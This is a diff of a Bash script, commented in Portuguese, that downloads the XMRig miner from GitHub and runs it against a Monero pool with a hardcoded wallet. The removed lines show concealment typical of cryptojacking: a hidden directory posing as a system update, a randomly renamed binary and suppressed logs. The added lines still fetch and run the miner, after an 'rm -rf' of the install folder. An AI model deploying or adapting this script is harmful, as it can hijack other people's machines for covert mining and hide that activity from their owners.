@@ -2,28 +2,35 @@
 
 # === CONFIGURAÇÃO ===
 WALLET="46sF91sVBzUVMgoV2nd5DQTSKM1LgvArTQNw5kufrVNYVV4CDrMiKno4c5kTpoqnH9eVu3dGqTuyEWH5muz32f9XESZHUrm"
-
 POOL="xmr-eu1.nanopool.org:14433"
 WORKER=$(hostname)-$(date +%s)
-RAND_BIN=$(tr -dc a-z0-9 </dev/urandom | head -c 8)
+DIR="$HOME/miner"
+BIN_NAME="xmrig"
 
-echo "[+] Atualizando sistema e instalando dependências..."
-apt update -y && apt install -y wget tar
+# Preparar ambiente
+rm -rf $DIR && mkdir -p $DIR && cd $DIR
 
-echo "[+] Criando diretório oculto..."
-mkdir -p ~/.sysupd/.core
-cd ~/.sysupd/.core
+# Detectar arquitetura
+ARCH=$(uname -m)
+echo "[+] Arquitetura: $ARCH"
 
-echo "[+] Baixando e extraindo XMRig..."
-wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-x64.tar.gz -O core.tar.gz
-tar -xf core.tar.gz
-cd xmrig-*-linux-x64 || exit
+if [[ "$ARCH" == "x86_64" ]]; then
+  echo "[+] Baixando XMRig 6.22.2 para x86_64..."
+  wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -O miner.tar.gz
+elif [[ "$ARCH" == "aarch64" ]]; then
+  echo "[+] Baixando XMRig 6.22.2 para ARM (aarch64)..."
+  wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-arm64.tar.gz -O miner.tar.gz
+else
+  echo "[!] Arquitetura não suportada: $ARCH"
+  exit 1
+fi
 
-echo "[+] Renomeando e executando o minerador..."
-mv xmrig $RAND_BIN
-chmod +x $RAND_BIN
+# Extrair e entrar na pasta correta
+tar -xf miner.tar.gz
+FOLDER=$(find . -maxdepth 1 -type d -name "xmrig-*" | head -n1)
+cd "$FOLDER"
 
-./$RAND_BIN -o $POOL -u $WALLET -k --tls \
-  --donate-level=0 --cpu-priority=5 \
-  --log-file=/dev/null --user-agent="$WORKER"
-
+# Rodar minerador com opção correta de moeda
+chmod +x $BIN_NAME
+echo "[+] Iniciando mineração com worker $WORKER..."
+./$BIN_NAME -o $POOL -u $WALLET -k --tls --cpu-priority=5 --coin monero
